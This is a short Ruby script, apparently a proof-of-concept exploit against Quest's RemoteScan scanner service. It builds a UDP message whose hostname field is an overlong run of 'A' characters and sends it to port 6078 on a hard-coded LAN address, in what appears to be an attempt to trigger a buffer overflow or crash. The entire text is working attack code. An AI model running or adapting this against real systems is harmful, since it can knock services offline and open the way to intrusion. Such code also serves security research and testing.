#!/usr/bin/env ruby
# bundled with quest's remotescan
require 'rex'

data = "A" * 154 

buff =  data # %s hostname
buff << "|6077"
buff << "^TWAIN2 FreeImage Software Scanner"
buff << "|0"
buff << "|9.500000,14.000000,0.000000,0.000000,8.500000,14.000000"
buff << "|1"
buff << "|0"
buff << "|0"
buff << "|0"
buff << "|127.0.0.1"
buff << "|0,1,2" 
buff << "|0"
buff << "|0"
buff << "|0"
buff << "|0"

begin
	sock = Rex::Socket::Udp.create( 'PeerHost' => '192.168.5.128',
					'PeerPort' =>  6078,
					'LocalPort' => 6078,
					)

	sock.write(buff)
rescue => e
	puts "[!] #{e.to_s}"
end
